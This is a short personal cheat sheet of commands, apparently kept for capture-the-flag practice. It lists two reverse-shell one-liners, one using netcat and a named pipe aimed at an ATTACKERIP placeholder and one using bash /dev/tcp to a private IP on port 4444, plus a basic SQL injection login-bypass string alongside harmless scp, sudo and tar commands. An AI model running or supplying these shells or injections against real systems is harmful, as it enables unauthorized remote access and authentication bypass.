---
dg-publish: true
---

I hope to grow this list over time as I do more challenges and learn more useful commands 

- Reverse Shells
	`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKERIP 4444 >/tmp/f" >> /file/you/want/appended`

	`bash -i >& /dev/tcp/192.168.133.226/4444 0>&1`

- Secure Copy 
	`scp -p PORT file.txt username@remoteIP:/folder/location`

- Check sudo permissions
	- `sudo -l`

- Extract .tar file
	- `tar -xzf /path/to/file`

- SQL Injection Test
	- `'admin' OR '1'='1' --`